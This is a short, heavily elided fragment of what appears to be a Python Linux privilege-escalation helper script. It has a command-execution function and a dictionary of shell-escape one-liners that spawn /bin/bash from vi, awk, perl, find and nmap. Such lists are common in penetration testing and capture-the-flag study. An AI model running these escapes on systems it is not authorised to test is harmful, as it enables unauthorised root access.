...
def execCmd(cmdDict):
	for item in cmdDict:
		...
		# Handle subprocess differently for compatibility
		try:
			# Try modern subprocess.run first (Python 3.5+)
		...
		# Split output into lines and handle as string
...
escapeCmd = {"vi":["#!/bin/bash", ":set shell=/bin/bash:shell"], "awk":["awk 'BEGIN {system(\"/bin/bash\")}'"], "perl":["perl -e 'exec \"/bin/bash\";'"], "find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], "nmap":["--interactive"]}
